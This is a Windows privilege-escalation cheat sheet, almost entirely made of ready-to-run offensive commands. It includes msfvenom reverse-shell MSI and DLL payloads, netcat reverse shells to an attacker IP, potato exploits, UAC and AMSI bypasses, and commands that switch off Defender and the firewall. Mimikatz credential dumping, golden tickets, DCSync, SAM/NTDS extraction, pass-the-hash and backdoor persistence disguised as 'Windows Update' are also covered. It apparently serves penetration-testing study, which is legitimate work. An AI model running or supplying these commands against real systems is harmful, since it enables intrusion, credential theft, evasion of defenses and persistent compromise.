# Windows Privilege Escalation Cheat Sheet

## Enumeration Scripts

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe all

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck

# Windows Exploit Suggester
python windows-exploit-suggester.py --database <db> --systeminfo systeminfo.txt

# Sherlock (PowerShell)
. .\Sherlock.ps1
Find-AllVulns
```

---

## System Information

```powershell
# Basic info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Hostname
hostname

# User info
whoami
whoami /priv
whoami /groups
whoami /all

# Network info
ipconfig /all
route print
arp -A

# Installed software
wmic product get name,version,vendor
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

# Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix

# Environment variables
set
Get-ChildItem Env:

# Drives
wmic logicaldisk get caption,description,providername
fsutil fsinfo drives
Get-PSDrive
```

---

## User Enumeration

```powershell
# Current user
whoami
echo %USERNAME%

# All local users
net user
Get-LocalUser

# Specific user info
net user <username>
Get-LocalUser -Name <username>

# Local administrators
net localgroup administrators
Get-LocalGroupMember -Group "Administrators"

# All groups
net localgroup
Get-LocalGroup

# Domain users (if domain joined)
net user /domain
net group "Domain Admins" /domain
```

---

## Network & Firewall

```powershell
# Network connections
netstat -ano
Get-NetTCPConnection

# Firewall status
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all

# Disable firewall (if admin)
netsh advfirewall set allprofiles state off
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

---

## Running Processes & Services

```powershell
# Processes
tasklist
tasklist /svc
Get-Process

# Process details
wmic process list brief
wmic process get name,executablepath,processid

# Services
sc query
Get-Service
wmic service list brief

# Service details
sc qc <service>
Get-Service | Select Name,DisplayName,Status

# Running as SYSTEM
tasklist /fi "username eq system"
```

---

## Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# Specific task details
schtasks /query /TN "\Microsoft\Windows\AppID\VerifiedPublisherCertStoreCheck" /fo list /v
```

---

## Unquoted Service Path

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Select Name,PathName,StartMode

# Check permissions on directory
icacls "C:\Program Files\Some Folder"
accesschk.exe -dqv "C:\Program Files\Some Folder"

# Exploitation
# If path: C:\Program Files\Some Folder\service.exe
# Create malicious executable:
# C:\Program.exe
# C:\Program Files\Some.exe
# Then restart service
sc stop <service>
sc start <service>
```

---

## Weak Service Permissions

```powershell
# Check service permissions
accesschk.exe /accepteula -uwcqv *
accesschk.exe -uwcqv <username> *

# Check specific service
sc sdshow <service>
accesschk.exe -ucqv <service>

# If SERVICE_CHANGE_CONFIG
sc config <service> binpath= "net localgroup administrators <user> /add"
sc stop <service>
sc start <service>

# If SERVICE_ALL_ACCESS
sc config <service> binpath= "C:\path\to\malicious.exe"
net start <service>

# Or modify service directly
sc config <service> binpath= "cmd /c net localgroup administrators <user> /add"
net start <service>
```

---

## Registry Autoruns

```powershell
# Check autorun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Get-ItemProperty
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# If writable
# Replace binary with malicious one
icacls <binary_path>
```

---

## AlwaysInstallElevated

```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both should return 0x1

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o installer.msi

# Install
msiexec /quiet /qn /i installer.msi
```

---

## Stored Credentials

```powershell
# Saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:admin cmd.exe

# Credential Manager
vaultcmd /listcreds:"Windows Credentials"

# Unattended install files
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\Sysprep\Sysprep.xml
C:\Windows\System32\Sysprep\Unattend.xml

# IIS web.config
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# McAfee SiteList.xml
%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml
```

---

## Group Policy Preferences (GPP)

```powershell
# Search for Groups.xml
dir /s Groups.xml
findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml

# Decrypt cpassword
gpp-decrypt <cpassword>

# PowerSploit
Get-GPPPassword
```

---

## Token Impersonation

```powershell
# Check privileges
whoami /priv

# SeImpersonatePrivilege
# Use JuicyPotato, RoguePotato, PrintSpoofer

# JuicyPotato
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators <user> /add" -t *

# PrintSpoofer
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "nc.exe <attacker_ip> 4444 -e cmd"

# RoguePotato
.\RoguePotato.exe -r <attacker_ip> -e "cmd.exe" -l 9999

# SeDebugPrivilege
# Can access any process memory
# Use Mimikatz or procdump
```

---

## DLL Hijacking

```powershell
# Find missing DLLs
# Use Process Monitor (procmon.exe)
# Filter: Result is "NAME NOT FOUND"

# Check DLL search order
1. Directory of executable
2. System directory (C:\Windows\System32)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o malicious.dll

# Place in writable directory in search order
```

---

## UAC Bypass

```powershell
# eventvwr.exe
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# fodhelper.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe

# computerdefaults.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
computerdefaults.exe

# sdclt.exe
reg add HKCU\Software\Classes\Folder\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\Folder\shell\open\command /v DelegateExecute /f
sdclt.exe /KickOffElev
```

---

## Pass-the-Hash

```powershell
# PSExec with hash
pth-winexe -U 'DOMAIN/user%hash' //target cmd

# Impacket
impacket-psexec -hashes :<NTLM> administrator@target
impacket-wmiexec -hashes :<NTLM> administrator@target

# CrackMapExec
crackmapexec smb <target> -u administrator -H <NTLM>

# Mimikatz
sekurlsa::pth /user:administrator /domain:<domain> /ntlm:<hash> /run:cmd
```

---

## Kernel Exploits

```powershell
# Check for missing patches
systeminfo
wmic qfe list

# Search exploits
# MS16-032 (2016)
# MS17-010 (EternalBlue)
# CVE-2020-0787
# PrintNightmare (CVE-2021-34527)

# Windows Exploit Suggester
python windows-exploit-suggester.py --database <db> --systeminfo systeminfo.txt
```

---

## Password Hunting

```powershell
# Search in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Search files
findstr /si password *.txt *.xml *.config *.ini
dir /s *pass* == *cred* == *vnc* == *.config*

# Common locations
type C:\Windows\Panther\Unattend.xml
type C:\inetpub\wwwroot\web.config
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# PowerShell history
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Wi-Fi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear
```

---

## Sensitive Files

```powershell
# SAM & SYSTEM hives
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# Copy SAM and SYSTEM
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Extract hashes
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# NTDS.dit (Domain Controller)
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

---

## Mimikatz

```powershell
# Run Mimikatz
.\mimikatz.exe

# Enable debug privilege
privilege::debug

# Dump credentials
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# Export Kerberos tickets
sekurlsa::tickets /export

# Pass-the-Hash
sekurlsa::pth /user:administrator /domain:<domain> /ntlm:<hash> /run:cmd

# Golden Ticket
kerberos::golden /user:administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# DCSync
lsadump::dcsync /domain:<domain> /user:administrator
```

---

## Writable Directories

```powershell
# Common writable locations
C:\Windows\Temp
C:\Temp
C:\Users\<username>\AppData\Local\Temp
C:\Windows\Tasks
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
```

---

## Exploiting Backup Operators

```powershell
# If member of Backup Operators group
# Can backup SAM and SYSTEM

# Backup SAM
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive

# Copy NTDS.dit (DC)
wbadmin start backup -backuptarget:\\<attacker>\share -include:C:\Windows\NTDS
```

---

## Antivirus Evasion

```powershell
# Check AV status
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName

# Check Windows Defender
Get-MpComputerStatus
sc query windefend

# Disable Windows Defender (admin required)
Set-MpPreference -DisableRealtimeMonitoring $true
netsh advfirewall set allprofiles state off

# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## Persistence

```powershell
# Registry Run keys
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc onlogon /ru System

# Service
sc create Backdoor binpath= "C:\backdoor.exe" start= auto
sc start Backdoor

# WMI event subscription
# (Complex - see post-exploitation guide)

# Startup folder
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## Checklist

- [ ] Run enumeration scripts (WinPEAS, PowerUp)
- [ ] Check privileges (whoami /priv)
- [ ] Search for unquoted service paths
- [ ] Check service permissions
- [ ] Look for writable services
- [ ] Check AlwaysInstallElevated
- [ ] Search for stored credentials
- [ ] Check for GPP passwords
- [ ] Look for autologon credentials
- [ ] Check scheduled tasks
- [ ] Review registry autoruns
- [ ] Search for password files
- [ ] Check for token impersonation
- [ ] Look for DLL hijacking
- [ ] Check for UAC bypass methods
- [ ] Search for kernel exploits
- [ ] Check writable PATH directories
- [ ] Review application config files

---

## Tools

- WinPEAS
- PowerUp
- Seatbelt
- PrivescCheck
- Sherlock
- Windows Exploit Suggester
- accesschk.exe (Sysinternals)
- Mimikatz
- JuicyPotato / PrintSpoofer
- PowerSploit
- SharpUp

---

## Resources

- LOLBAS: https://lolbas-project.github.io/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Windows Privilege Escalation Fundamentals: https://www.fuzzysecurity.com/tutorials/16.html
- Windows PrivEsc Course: https://www.udemy.com/course/windows-privilege-escalation/
